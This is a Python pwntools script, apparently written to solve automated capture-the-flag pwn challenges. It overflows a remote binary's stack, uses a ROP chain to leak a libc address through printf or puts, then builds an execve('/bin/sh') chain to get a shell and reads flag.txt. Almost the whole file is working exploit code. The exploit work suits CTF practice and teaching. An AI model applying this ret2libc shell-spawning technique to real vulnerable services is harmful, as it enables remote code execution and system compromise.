from pwn import *
import detection
import re

#context.log_level = 'ERROR'
#logging.disable(logging.CRITICAL)
context.clear(arch='amd64')
# ------------------------------------- #
# exploit(binary: str)                  #
#                                       #
# INPUT:  filename of vulnerable binary #
# OUTPUT: remote flag                   #
# ------------------------------------- #
def exploit(binary: str):
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443, ssl=True, sni=url)
    #p = process(binary)
    #pid = gdb.attach(p, 'b *vuln+94\ncontinue')
    e = ELF(binary)
    rop = ROP(binary)
    libc = ELF('libc.so.6')
    

    payload = b''

    padding = cyclic(detection.find_rip_offset(binary))
    payload += padding
        
    if 'printf' in e.got:
        payload += p64(rop.ret.address)
        rop(rdi = e.got['printf'])
        
        payload += rop.chain()
        payload += p64(e.sym['printf'])
        
        payload += p64(rop.ret.address)
        payload += p64(e.sym['main'])
        selected = 'printf'
    elif 'puts' in e.got:
        payload += p64(rop.ret.address)
        rop.puts(e.got['puts'])
        payload += rop.chain()
        payload += p64(rop.ret.address)
        payload += p64(e.sym['main'])
        selected = 'puts'
        
    #print(selected)
    last_byte = p64(libc.sym[selected])[0].to_bytes(1, 'little')
    p.sendline(payload)
    #print(payload)
    
    p.recvuntil(last_byte, timeout=1)

    leak = last_byte + p.recv(5)

    leak = u64(leak + b'\x00' * (8-len(leak)))
    
    libc.address = leak - libc.sym[selected] #This successfully sets the libc base address
    
    libc_rop = ROP(libc)
    payload = b''
    payload += padding
    libc_rop(rdi = next(libc.search(b'/bin/sh\x00')), rsi=0, rdx=0)
    libc_rop.call('execve')
    payload += libc_rop.chain()
    p.sendline(payload)
    
    #Since I'm going for a shell rather than a win function, there's no try and see here.
    #p.interactive()
    p.sendline(b'cat flag.txt')
    output = p.recvall(timeout=0.2)

    flag = re.findall(flag_regex, output.decode())
    if flag: # Success

        return flag[0]
    else: # Failure
        return
    
    
#Works on ret2execve, ret2one, ret2syscall, ret2system
#Fails on ret2win
